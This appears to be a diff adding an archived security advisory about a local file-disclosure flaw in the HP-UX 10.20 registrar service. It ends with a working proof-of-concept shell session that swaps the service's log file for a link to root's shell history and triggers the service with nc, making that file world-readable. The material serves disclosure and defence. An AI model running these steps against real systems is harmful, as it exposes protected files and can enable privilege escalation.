@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/1919/info
+
+The registrar service that ships with version 10.20 (possibly others) of HP's HP-UX operating system contains a vulnerability that may allow a local user to read any file on the hosts filesystem. The service (which listens on tcp port 1712) writes to a log file, /etc/opt/resmon/log/registrar.log. 
+
+Default permissions on the /etc/opt/resmon/log directory allow users to overwrite the log file within it via "mv", which is normally created and written to by root when connections are made to the service. 
+
+After mv'ing an existing log file to another location, a malicious user can create a symbolic link to an arbitrary file they do not have read access to with the filename registrar.log in etc/opt/resmon/log. If any connections are made to the registrar service after this, the mode of the file pointed to will change to 0644 (world readable) and log data will be appended to it.
+
+In addition to disclosing to the user restricted information, this may lead to an elevation of privileges for the local attacker.
+
+$ uname -sr
+HP-UX B.10.20
+$ cd /etc/opt/resmon/log
+$ mv registrar.log registrar.log.orig
+$ ls -l /.sh_history
+-rw------- 1 root sys 3316 Sep 20 15:22 /.sh_history
+$ ln /.sh_history registrar.log
+$ nc hpux.example.com 1712 < /etc/motd
+$ ls -l /.sh_history
+-rw-r--r-- 2 root sys 3605 Nov 8 09:45 /.sh_history
+$ rm -f registrar.log
+$ mv registrar.log.orig registrar.log
